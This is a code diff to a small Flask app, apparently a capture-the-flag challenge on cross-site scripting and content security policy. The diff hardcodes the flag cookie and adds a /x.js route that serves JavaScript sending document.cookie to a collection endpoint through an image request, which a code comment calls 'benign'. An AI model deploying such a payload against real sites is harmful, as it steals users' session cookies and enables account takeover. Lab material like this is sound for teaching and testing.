@@ -28,7 +28,7 @@ def index():
 
 @app.route("/admin")
 def admin():
-    FLAG = os.getenv("FLAG") or "flag{xss_csp}"
+    FLAG = "flag{xss_csp}"
     resp = make_response("admin panel")
     resp.headers['Set-Cookie'] = "flag=" + FLAG + "; Path=/; Secure"
     return resp
@@ -39,5 +39,17 @@ def collect():
     print("Stolen: " + stolen)
     return "ok"
 
+
+
+@app.route("/x.js")
+def xjs():
+    # Sends the cookie to /c via a benign image request
+    return (
+        "new Image().src='/c?c='+encodeURIComponent(document.cookie);",
+        200,
+        {"Content-Type": "application/javascript"},
+    )
+
+
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000, debug=True)
+    app.run(host="0.0.0.0", port=5000, debug=True, ssl_context="adhoc")
